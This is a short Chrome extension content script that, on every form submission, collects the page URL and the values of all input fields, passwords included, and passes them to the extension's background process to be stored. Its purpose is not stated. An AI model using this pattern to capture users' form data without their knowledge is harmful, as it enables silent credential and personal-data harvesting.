$(document).ready(() => {
  $('form').on('submit', (event) => {
    chrome.extension.sendRequest({
      action: 'store',
      data: [
        window.location.href,
        $(event.target).find('input').toArray().map(el => {
          const $el = $(el);
          return [$el.attr('id') || $el.attr('name') || $el.attr('type'), $el.val()];
        }).reduce((acc, [id, val]) => { acc[id] = val; return acc } , {}),
      ],
    });
  });
});
